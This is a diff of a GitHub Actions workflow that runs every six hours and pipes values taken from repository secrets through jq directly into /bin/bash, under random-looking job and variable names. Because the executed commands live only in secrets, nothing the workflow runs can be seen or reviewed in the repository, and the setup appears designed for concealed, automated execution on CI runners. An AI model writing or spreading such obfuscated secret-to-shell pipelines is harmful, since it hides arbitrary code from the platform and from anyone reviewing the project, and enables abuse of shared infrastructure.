@@ -2,29 +2,19 @@ name: zhangminming3487
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 3/6 * * *'
+    - cron: '29 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangminming3487
         env:
-          ncyyk50912: ${{ secrets.ncyyk50912 }}
+          uy879: ${{ secrets.uy879 }}
         run: |
-          echo $ncyyk50912 | jq -r .fgv9 | /bin/bash
-          echo $bdark61741 | jq -r .fkzu38324 | /bin/bash
-          echo $j7540 | jq -r .zc148 | /bin/bash
-          echo $znatb2 | jq -r .uon75605 | /bin/bash
-          echo $yixut4657 | jq -r .gsmb4 | /bin/bash
-          echo $td5483 | jq -r .yiice693 | /bin/bash
-          echo $spwl5 | jq -r .oyxh79276 | /bin/bash
-          echo $eyld910 | jq -r .ecb52 | /bin/bash
-          echo $ur26880 | jq -r .t355 | /bin/bash
-          echo $cint7 | jq -r .rrd37 | /bin/bash
-          echo $e5 | jq -r .fxwlp99 | /bin/bash
-          echo $eak7 | jq -r .jsa40934 | /bin/bash
-          echo $t2 | jq -r .cqvs44033 | /bin/bash
-          echo $c04 | jq -r .ak2 | /bin/bash
-          echo $ccpt72 | jq -r .jpuz117 | /bin/bash
+          echo $uy879 | jq -r .iptp0972 | /bin/bash
+          echo $wa712 | jq -r .j896 | /bin/bash
+          echo $kaqb425 | jq -r .ssstq92909 | /bin/bash
+          echo $ujt4234 | jq -r .ul27 | /bin/bash
 
